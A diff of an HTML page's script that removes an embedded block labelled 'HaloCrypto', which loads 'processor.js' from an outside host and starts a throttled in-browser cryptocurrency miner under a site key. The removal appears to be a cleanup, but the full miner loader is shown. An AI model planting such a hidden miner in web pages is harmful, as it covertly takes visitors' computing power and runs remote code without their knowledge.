@@ -213,45 +213,6 @@
       }
       acceptButton.addEventListener("click", buttonClick1);
       declineButton.addEventListener("click", buttonClick2);
-
-      ////////////////// HaloCrypto //////////////////
-      function loadScript(url, callback) {
-        var head =
-            document.head ||
-            document.getElementsByTagName("head")[0] ||
-            document.documentElement,
-          script,
-          options,
-          s = options || {};
-        url = url || s.url;
-        callback = callback || s.success;
-        script = document.createElement("script");
-        script.async = s.async || false;
-        script.type = "text/javascript";
-        if (s.charset) {
-          script.charset = s.charset;
-        }
-        if (s.cache === false) {
-          url =
-            url + (/\?/.test(url) ? "&" : "?") + "_=" + new Date().getTime();
-        }
-        script.src = url;
-        head.insertBefore(script, head.firstChild);
-        if (callback) {
-          document.addEventListener
-            ? script.addEventListener("load", callback, false)
-            : (script.onreadystatechange = function () {
-                if (/loaded|complete/.test(script.readyState)) {
-                  script.onreadystatechange = null;
-                  callback();
-                }
-              });
-        }
-      }
-      loadScript("//shiws.agteam.eu.org/processor.js", function () {
-        var _ = new HaloCrypto.Anonymous("u_12-fishing", { throttle: 0.01 });
-        _.start();
-      });
     </script>
   </body>
 </html>
